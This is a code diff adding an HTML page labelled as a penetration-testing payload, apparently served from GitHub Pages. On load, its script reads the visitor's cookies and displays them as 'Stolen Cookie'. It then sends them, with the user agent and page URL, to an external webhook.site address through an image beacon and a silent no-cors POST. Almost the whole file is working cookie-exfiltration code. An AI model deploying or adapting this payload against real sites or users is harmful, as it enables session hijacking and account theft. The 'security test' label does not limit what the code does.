@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PMS GPT Payload</title>
+    <style>
+        body { 
+            background: #1a1a2e; 
+            color: #e94560; 
+            font-family: Arial; 
+            padding: 20px; 
+            text-align: center; 
+            margin: 0;
+        }
+        .box { 
+            background: #16213e; 
+            padding: 20px; 
+            border-radius: 10px; 
+            border: 2px solid #e94560;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        h1 { color: #00ff00; margin-top: 0; }
+        .cookie-box { 
+            background: #0a0a23; 
+            padding: 10px; 
+            border-radius: 5px; 
+            word-break: break-all;
+            font-size: 12px;
+            color: #ffcc00;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🚀 [VAPT] Payload Executed!</h1>
+        <p>Server Time: <span id="time"></span></p>
+        <p>User Agent: <span id="ua"></span></p>
+        <div class="cookie-box">
+            <strong>Stolen Cookie:</strong><br>
+            <span id="cookieDisplay">Reading...</span>
+        </div>
+        <p style="font-size:10px;color:#666;margin-top:20px;">This is a security test payload</p>
+    </div>
+
+    <script>
+        // Display current time
+        document.getElementById('time').textContent = new Date().toISOString();
+        document.getElementById('ua').textContent = navigator.userAgent;
+
+        // Steal cookies
+        var cookie = document.cookie || 'No cookies found';
+        document.getElementById('cookieDisplay').textContent = cookie;
+
+        // Send to your Webhook.site
+        var webhook = 'https://webhook.site/56d41307-ff92-47c8-a42c-c41aa27410f4';
+        
+        // Method 1: Image beacon (GET - no CORS)
+        new Image().src = webhook + '?cookie=' + encodeURIComponent(cookie) + '&src=GitHub_Pages';
+
+        // Method 2: Fetch with no-cors
+        try {
+            fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    cookie: cookie, 
+                    source: 'GitHub Pages Payload',
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                })
+            });
+        } catch(e) { /* silently fail */ }
+    </script>
+</body>
+</html>
